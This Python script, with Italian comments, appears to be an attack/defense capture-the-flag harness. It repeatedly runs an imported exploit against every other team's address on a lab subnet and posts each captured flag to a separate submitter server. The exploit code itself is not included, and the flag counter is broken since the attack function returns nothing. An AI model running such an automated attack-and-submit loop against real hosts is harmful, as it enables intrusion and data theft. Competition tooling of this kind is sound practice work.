import requests
import time
from script_ticket import *


def send_attack(ip, team_id):
    print(f"Attacco in corso a {ip}\n") 
    results = get_info(team_id) #ritorna una lista di dizionari, per eventuali altri script modificare attributi
    print(results) # per debug, opzionale
    for i in range (0,4): #itera sui 4 round nelle info prese da fileID
        #round = results[i]["round"] if results else None #se si vuole fare qualcosa con i round
        ctf_id = results[i]["ctf_id"] if results else None
        ticket_id = results[i]["ticket_id"] if results else None
        #print(round) 
        #print(ctf_id)
        #print(ticket_id)
        flag = exploit(ip, ctf_id, ticket_id)
        data = {'flag': flag}
        response = requests.post(submitter_ip, data=data)
        print("Status Code:", response.status_code)
        print("Response Body:", response.text)
    return

#funzione per salvare le flag su un file, ma non serve più
def save_flag(flag):
    try:
        with open("CTF-Tools/flags.txt", "a") as f:
            f.write(flag + "\n")
        print(f"Flag salvata: {flag}\n")
        return 1
    except Exception as e:
        print(f"[!] Errore durante il salvataggio della flag: {e}\n")
        return 0

if __name__ == "__main__":
    team_ip = "10.60.64.1"
    teams = 81 #da modificare in base al numero di team
    round_inf = 0 #scrivere qua round minore
    submitter_ip = "http://10.81.64.1:5000" #scrivere qua submitter id
    while True:
        flags_found = 0
        for i in range(teams):
            ip = f"10.60.{i}.1"
            if ip == team_ip:
                continue
            try:
                print(f"Inizio attacco a {ip}")
                flag = send_attack(ip, i)
                if flag:  # Se è stata trovata una flag
                    flags_found += 1
            except Exception as e:
                print(f"[!] Errore durante l'attacco a {ip}: {e}")

        # Aggiungi una riga vuota per separare i round
        with open("CTF-Tools/flags.txt", "a") as f:
            f.write("\n\n")

        print(f"Giro completato. Trovate {flags_found} flag. Aspetto 120 secondi per il prossimo attacco...\n")
        time.sleep(120)